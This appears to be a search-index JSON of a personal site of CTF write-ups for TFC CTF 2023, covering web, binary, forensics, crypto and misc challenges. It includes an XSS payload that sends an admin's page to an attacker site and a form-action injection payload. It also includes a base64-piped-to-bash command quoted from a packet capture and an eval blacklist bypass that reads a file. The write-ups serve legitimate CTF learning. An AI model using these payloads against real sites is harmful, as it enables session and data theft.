{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome","text":"<p>This site contains every writeup of every CTF I've partecipated since 2023.</p>"},{"location":"#github-repositories","title":"Github Repositories","text":"<ul> <li><code>m0leCon CTF 2023</code> - I haven't made any writeup for this CTF.</li> <li><code>TFC CTF 2023</code> - Repository site</li> <li><code>Securinets CTF 2023</code> - Respository site</li> <li><code>To be continued</code> - To be continued</li> </ul>"},{"location":"#useful-tools","title":"Useful tools","text":""},{"location":"#binary","title":"Binary","text":"Name Site Repository Documentation Installation <code>Ghidra</code> Site Repository Docs Check the repository <code>IDA</code> Site  No repository Docs Check the site <code>gdb</code> Site Repository Docs <code>sudo apt install gdb</code> <code>pwndbg</code> Site Repository Docs Check the repository <code>pwntools</code>      No site Repository Docs <code>pip install pwntools</code> <code>ltrace</code> Site Repository <code>man ltrace</code> <code>sudo apt install trace</code>"},{"location":"#web-security","title":"Web security","text":"Name Site Repository Documentation Installation <code>Burp Suite</code> Site  No repository Docs Check the site <code>Selenium</code> Site Repository Docs <code>pip install selenium</code> <code>Requests</code>      No site Repository Docs <code>pip install requests</code> <code>dirsearch</code>      No site Repository Docs <code>pip install dirsearch</code> <code>Postman</code> Site Repository Docs Check the site"},{"location":"#cryptography","title":"Cryptography","text":"Name Site Repository Documentation Installation <code>Pycryptodome</code>      No site  No repository Docs <code>pip install pycryptodome</code> <code>Sagemath</code> Site  No repository Docs Check the site <code>Mtp</code>      No site Repository Check the repository <code>pip install mtp</code> <code>RsaCTFTool</code>      No site Repository Check the repository Check the repository"},{"location":"#miscellaneous","title":"Miscellaneous","text":"Name Site Repository Documentation Installation <code>Wireshark</code> Site Repository Docs <code>sudo apt install wireshark</code> <code>Zsteg</code>      No site Repository Check the repository Check the repository <code>Stegsolve</code>      No site      No repository      No documentation Installation <code>Gimp</code> Site Repository Docs Check the site"},{"location":"TFCCTF-2023/","title":"TFC CTF 2023","text":""},{"location":"TFCCTF-2023/#web","title":"Web","text":""},{"location":"TFCCTF-2023/#baby-ducky-notes","title":"Baby Ducky Notes","text":"<p>This challenge looked like a normal notes sharing site, but after a quick view to the source code, it was easy to find the way to read the flag. In fact the <code>database.db</code> file had a query to initialize the notes table with this code:  <pre><code>query(con, f''' \nINSERT INTO posts (\n    user_id,\n    title,\n    content,\n    hidden\n    ) VALUES (\n        1,\n        'Here is a ducky flag!',\n        '{os.environ.get(\"FLAG\")}',\n        0\n);\n''')\n</code></pre> This could only means that the flag wasn't hidden and the easiest way to find it was to make a GET request to the url <code>http://challs.tfcctf.com:port/posts/view/admin</code> and the flag was in fact right there.</p>"},{"location":"TFCCTF-2023/#baby-ducky-notes-revenge","title":"Baby Ducky Notes: Revenge","text":"<p>Now the challenge was a bit more difficult than the previous one because the flag was hidden and the only way to read it was to make the admin read it for me or by stealing the admin's cookie which was HttpOnly. After looking for a while in the source code, I found a line from the template of the posts page: <pre><code>&lt;ul class=\"posts_ul\"&gt;\n    {% for post in posts %}\n    &lt;li&gt;\n&lt;div class=\"blog_post\"&gt;\n&lt;div class=\"container_copy\"&gt;\n&lt;h1&gt; {{post.get('title')}} &lt;/h1&gt;\n&lt;h3&gt; {{post.get('username')}} &lt;/h3&gt;\n&lt;p&gt; {{post.get('content') | safe}} &lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/li&gt;\n    {% endfor %} \n&lt;/ul&gt;\n</code></pre> The content was rendered without any sanitizing and because of that I could perform an XSS using this payload <pre><code>&lt;script&gt;\nasync function attack(){\nvar xhr = new XMLHttpRequest();\nxhr.open(\"GET\", \"/posts/view/admin\", true);\nxhr.responseType = \"text\";\nxhr.onload = () =&gt; {\nwindow.location.href = \"{input('Enter the url of your site: ')}?html=\" + btoa(xhr.responseText.toString());\n};\nawait xhr.send(null);\n}\nattack();\n&lt;/script&gt;\n</code></pre> After executing this code the admin could read its notes (including the flag) and send the whole html code encrypted in base64 to my website where I had to decrypt it to find the flag.</p>"},{"location":"TFCCTF-2023/#cookie-store","title":"Cookie Store","text":"<p>I really hated this challenge for a while because I couldn't run the javascript code of the page (which was quite important) because of an error of the <code>setHTML</code> javascript function which only worked when the site was running as <code>localhost</code> or with an <code>https</code> connection. I later found out a way to run docker as <code>localhost</code> (it initially used the local ip 172.17.x.x) but even if I spent a lot of time to resolve this problem, the challenge was quite interesting, in fact this site printed our 'notes' using some columns sorting method that was vulnerable. <pre><code>const urlParams = new URLSearchParams(window.location.search);\nconst fields = urlParams.get('fields');\nlet form_html = '';\nlet fields_list = [];\nif (fields) {\nfields_list = fields.split(',');\nfields_list.forEach(element =&gt; {\nform_html += `&lt;div class=\"mb-4\"&gt;\n            &lt;label for=\"${element}\" ... &gt;${element}&lt;/label&gt;\n            &lt;input type=\"text\" name=\"${element}\" id=\"${element}\" ...&gt;\n        &lt;/div&gt;`;\n});\n}\n// This will sanitize the input\ndocument.querySelector('#form_builder').setHTML(form_html);\n...\n</code></pre> This code in fact injects the input wihout any check in the html source code, then it removes any javascript script or method like <code>onerror</code> or <code>onload</code> before writing it in the page. This code is vulnerable because if I send this payload as a field <pre><code>\"&gt;&lt;input type=\"submit\" formaction=\"our site\" id=\"pwned\"&gt;&lt;label name=\"\n</code></pre> I can redirect the form data from the cookie store to my site and then read the flag that the admin wrote in the title field.</p>"},{"location":"TFCCTF-2023/#mctree","title":"MCTree","text":"<p>This challenge was really easy but, I was tired (just a lot of skill issue) and I couldn't understand the vulnerability during the CTF (sorry ZenHack) but anyway, the challenge didn't have any source code to download. In fact it was only a site where you could register, login and, if after the login you had the admin username, you could achive the flag. After a few attempts I saw that the challenge always removed any character like <code>{}&lt;&gt;[]'\"</code> so the payload was to send a username like <code>{admin</code> so that the site could accept our request because the username was different from <code>admin</code> and after a sanitizing our username was <code>admin</code> anyway. And that's it lol :).</p>"},{"location":"TFCCTF-2023/#binary","title":"Binary","text":""},{"location":"TFCCTF-2023/#diary","title":"Diary","text":"<p>This challenge was really nice and easy because it had RWX segments in it, no PIE and also hadn't any canary. <pre><code>Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX disabled\nPIE:      No PIE (0x400000)\nRWX:      Has RWX segments\n</code></pre> It had an important funciton <code>vuln</code> which only read 1024 chars in a 256 bytes long buffer, where I could perform an overflow to change the return pointer to another address <pre><code>fgets((char *)&amp;local_108,0x400,stdin);\n</code></pre> After using <code>ropgadgets</code> to find a useful code, I found a nice instruction <pre><code>call rax\n</code></pre> so the only thing that I had to do was to make a shellcode using the <code>shellcraft</code> module of pwntools to create a shellcode and then call it by changing the return pointer to the shellcode address.</p>"},{"location":"TFCCTF-2023/#shello-world","title":"Shello-World","text":"<p>This challenge is exactly the same of <code>Diary</code>, but in this one there is no buffer overflow to perform, because now the <code>vuln</code> function is the following <pre><code>fgets((char *)&amp;local_108,0x100,stdin);\nprintf(\"Hello, \");\nprintf((char *)&amp;local_108);\nputchar(10); // (chr)(10) == '\\n' =&gt; true\n</code></pre> This is pretty different from diary but still vulnerable as there's a format string vulnerability because the source file calls a <code>printf</code> without set any format string which means that we can use the <code>fmtstr_payload</code> function from pwntools to write a payload which replaces the address of the function <code>exit</code> from the GOT with the address of the <code>win</code> function that will open a shell on the remote machine.</p>"},{"location":"TFCCTF-2023/#random","title":"Random","text":"<p>If you give a quick look at this challenge it doesn't seem to be really vulnerable, but if you look at the call of the <code>sran</code> function in the decompiled section of your tool, you can easily see something that looks like this <pre><code>srand(time(NULL));\n</code></pre> which can be easily reproduced in python by using the <code>ctypes</code> library. So the exploit was to reproduce all the numbers generated by the seeded random function of the source file using a python script and than send them to the container to recive the flag.</p>"},{"location":"TFCCTF-2023/#forensics","title":"Forensics","text":""},{"location":"TFCCTF-2023/#list","title":"List","text":"<p>This challenge provided a file with a lot of http comunications always with the status code <code>404</code> or <code>403</code> when the client tries to get some 'random' directories. This is obviusly a bruteforce of the URIs directories that was performed using a tool like <code>gobuster</code> or <code>dirsearch</code>. Once I noticed this, I filtered all the responses by removing all those which had the status code <code>404</code> or <code>403</code>. This showed me some packets that looked like a response to a reverse shell command. <pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre> This could only mean that somewhere in the file there was a command executed by the attacker. In fact after a while I found out that there were a lot of packets that were HTTP POST requests, all with the same length (756 bytes) and with the same paylaod. <pre><code>echo \"ZmluZCAvaG9tZS9jdGYgLXR5cGUgZiAtbmFtZSAifSIgMj4vZGV2L251bGw=\" | base64 -d | bash\n</code></pre> This is in fact a bash command encoded in base64 and this is what I got after I decoded it <pre><code>find /home/ctf -type f -name \"T\" 2&gt;/dev/null\n</code></pre> and later I did the same on the next packet where I got the same payload with a little change <pre><code>find /home/ctf -type f -name \"F\" 2&gt;/dev/null\n</code></pre> So the flag was just splitted in many different commands and the only thing left to do was to write a script to get by using a regex filter.</p>"},{"location":"TFCCTF-2023/#some-traffic","title":"Some Traffic","text":"<p>This challenge required much more time than the previous one because it also had some normal http packets that were just requests and responses of the upload of three images to a website. After I've extracted all the images I tried to see what could be hidden in all the files, but I didn't find anything suspicious. However, the first image had three columns of green pixels that seemed to be a type of hidden data. <pre><code>(1, 84, 1)\n(1, 70, 1)\n(1, 67, 1)\n(1, 67, 1)\n(1, 84, 1)\n(1, 70, 1)\n(1, 123, 1)\n</code></pre> This was the result when I tried to extract the RGB values of each pixel of each colum: the Red value was always 1 and it was the same for the Blue value, but the Green one seemed to be an ASCII value. As a matter of fact they were just the format of the flag <code>TFCCTF{</code> hidden in the pixels.</p>"},{"location":"TFCCTF-2023/#mcteenx","title":"MCTeenX","text":"<p>This challenge was really interesting because it provided a zip file protected by a password that I couldn't bruteforce using a dictionary attack. It only had one file zipped in it that was a <code>.sh</code> file that normally has as first line like this  <pre><code>#!/bin/sh\n</code></pre> Since I knew part of the file text I could try a Plaintext Attack using <code>bkcrack</code> by executing this command <pre><code>bkcrack -C src.zip -c script.sh -p temp_file.sh\n</code></pre> (the <code>temp_file.sh</code> file was just the known plaintext). Luckily this tool could extract the <code>script.sh</code> file that seemed to be just an echo of an encoded base64 text piped in the file <code>red.png</code>. The first thing that popped up into my head was to analyze it using <code>zsteg</code> which found different things, but the most suspicious one was an hexadecimal text which, if decoded, appeared to be random bytes. <code>030a111418142c783b39380d397c0d25293324231c66220d367d3c23133c6713343e343b3931</code> After a few tries I attempted to xor it with the flag format <code>TFCCTF{</code> which gave me back a string like this <code>WLRWLRW</code>. I then repetead this string until I filled the whole length of the hex string and I xored it again to see what I could get. Even if the first try went wrong because I mistyped the string, the following one decrypted the flag.</p>"},{"location":"TFCCTF-2023/#cryptography","title":"Cryptography","text":""},{"location":"TFCCTF-2023/#dizzy","title":"Dizzy","text":"<p>Dizzy was the first challenge of the cyrpto section and it had this output <pre><code>T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24\n</code></pre> after thinking what this could mean, I saw that a few pairs were somehow suspicious<code>T0 F1 C2 C3 T4 F5 {6</code> Later I understood that all the pairs where just <code>char:position</code> randomly mixed, and after I've written a quick script (just look the <code>normal_solution</code> function in the solve script) I found the whole flag.</p>"},{"location":"TFCCTF-2023/#mayday","title":"Mayday","text":"<p>Like the previous one, this challenge had this output <pre><code>Whiskey Hotel Four Tango Dash Alpha Romeo Three Dash Yankee Oscar Uniform Dash Sierra One November Kilo India November Golf Dash Four Bravo Zero Uniform Seven\n</code></pre> which was just the NATO alphabet and the solution was just to map every word to a character (or number) to find the flag. P.S. The flag was in the format <code>TFCCTF{FOUND_TEXT}</code></p>"},{"location":"TFCCTF-2023/#alien-music","title":"Alien Music","text":"<p>This challenge was just pure guessing, but the solution was the easiest one in the crypto section, it had this output <pre><code>DC# C#D# C#C C#C DC# C#D# E2 C#5 CA EC# CC DE CA EB EC# D#F EF# D6 D#4 CC EC EC CC# D#E CC E4\n</code></pre> After analyzing it for a while, I tried to connect the first pairs to the format <code>TFCCTF{</code> and I tought that the connection could be: <pre><code>ord('T') =&gt; 0x54 =&gt; {'D' : 5, 'C#' : 4}\nord('F') =&gt; 0x46 =&gt; {'C#' : 4, 'D#' : 6}\nord('C') =&gt; 0x43 =&gt; {'C#' : 4, 'C' : 3}\n</code></pre> I tried to map all the pairs in this python dictionary :  <pre><code>d = {\n\"A\": \"0\", \"A#\" : \"1\", \"B\" : \"2\", \"C\" : \"3\",  \"C#\" : \"4\", \n\"D\": \"5\", \"D#\" : \"6\", \"E\" : \"7\", \"F\" : \"8\", \"F#\" : \"9\", \n\"1\": \"a\", \"2\" : \"b\", \"3\" : \"c\", \"4\" : \"d\", \"5\" : \"e\", \"6\" : \"f\"\n}\n</code></pre> and after that I wrote a quick script, I found the whole flag.</p>"},{"location":"TFCCTF-2023/#rabid","title":"Rabid","text":"<p>Rabid had a 'little' hint in the text which said that they wrote a little 'extra' information in the message, in fact the output ... <pre><code>VEZDQ1RGe13kwdV9yNGIxZF9kMGc/IT8hPyE/IT8hPi8+Pz4/PjEyMzkwamNhcHNrZGowOTFyYW5kb21sZXR0ZXJzYW5kbnVtYmVyc3JlZWVlMmozfQ==\n</code></pre> was a base64 encoded message with an encoded prefix that was the format <code>TFCCTF{</code> and the only way to find the remaining flag was just to remove from the base64 message the encoded message <code>TFCCTF{</code> and decode it again.</p>"},{"location":"TFCCTF-2023/#aes-ctf-tool-v1","title":"AES CTF Tool V1","text":"<p>To solve this challenge the easiest way was to install the tool that the admins wrote just for that challenge and execute the <code>main.py</code> file. <pre><code>alan@ubuntu:~$ python3 main.py\n[INFO] Starting initial cryptanalysis.\n[INFO] Starting initial cryptanalysis.\n[INFO] Determining block size.\n[X] Found block size: 16.\n[INFO] Determining block chiper category.\n[X] Found block cipher category: ECB_CBC.\n[INFO] Starting fingerprinting.\n[INFO] Determining block cipher mode.\n[X] Found block cipher mode: ECB.\n======= Probabilities =======\nECB: 100%\nCBC: 0%\nCFB: 0%\nOFB: 0%\nCTR: 0%\n=============================\n[INFO] ECB/CBC detected. Determining padding method.\n[X] Found padding method: Block.\n[INFO] Fingerprinting complete.\nWould you like to perform a Chosen Plaintext Attack? (Y/n) Y\nY\n\nOptimize search space for printable ascii? (Y/n) Y\nY\n\n[INFO] Starting Chosen Plaintext Attack.\nOffset: 8 bytes\nBlock number: 7\nFound: T\nFound: TF\nFound: TFC\nFound: TFCC\nFound: TFCCT\nFound: TFCCTF\nFound: TFCCTF{\n...\n</code></pre></p>"},{"location":"TFCCTF-2023/#aes-ctf-tool-v2","title":"AES CTF Tool V2","text":"<p>This challenge was exactly like the previous one but the tool also required to pass it an encrypted chipertext to decrypt. <pre><code>alan@ubuntu:~$ python3 main.py\n[INFO] Starting initial cryptanalysis.\n[INFO] Starting initial cryptanalysis.\n[INFO] Determining block size.\n[X] Found block size: 16.\n[INFO] Determining block chiper category.\n[X] Found block cipher category: ECB_CBC.\n[INFO] Starting fingerprinting.\n[INFO] Determining block cipher mode.\n[X] Found block cipher mode: CBC.\n======= Probabilities =======\nCBC: 100%\nECB: 0%\nCFB: 0%\nOFB: 0%\nCTR: 0%\n=============================\n[INFO] ECB/CBC detected. Determining padding method.\n[X] Found padding method: Block+.\n[INFO] Checking if the IV is reused for each encryption.\n[INFO] Reuses IV: True.\n[INFO] Fingerprinting complete.\nWould you like to perform a Padding Oracle Attack? (Y/n) Y\nY\n\n[INFO] Starting Padding Oracle Attack.\nEnter the ciphertext to decrypt (in hexadecimal): 4a1e62c51fd9e5f79919...\nFound byte: 84\nIntermediate value: 85\nFound byte: 247\nIntermediate value: 245\nFound byte: 214\nIntermediate value: 213\nFound byte: 159\nIntermediate value: 155\n...\n</code></pre></p>"},{"location":"TFCCTF-2023/#miscellaneous","title":"Miscellaneous","text":""},{"location":"TFCCTF-2023/#discord-shenanigans-v3","title":"Discord Shenanigans V3","text":"<p>This challenge was just pure trolling because the flag was in the discord bot logo of the ctf server.</p>"},{"location":"TFCCTF-2023/#my-first-calculator","title":"My First Calculator","text":"<p>I actually didn't solved this challenge during the CTF because I didn't know the existence of this exploit that I'm going to explain (credits dp_1). Python is just a 'misterious' programming language that has some strange vulnerabilities where it comes to strings. This challenge provided a python file like this <pre><code>import sys\nprint(\"This is a calculator\")\ninp = input(\"Formula: \")\nsys.stdin.close()\nblacklist = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.\"\nif any(x in inp for x in blacklist):\nprint(\"Nice try\")\nexit()\nfns = {\n\"pow\": pow\n}\nprint(eval(inp, fns, fns))\n</code></pre> The exploit consisted in sending a payload written in italic that just could bypass the blacklist and than could read the flag doing something like this  <pre><code>''.join(i for i in open(\"flag\", \"r\"))\n</code></pre></p> <ol> <li> <p>The best writeup is Dizzy (OII based)\u00a0\u21a9</p> </li> </ol>"}]}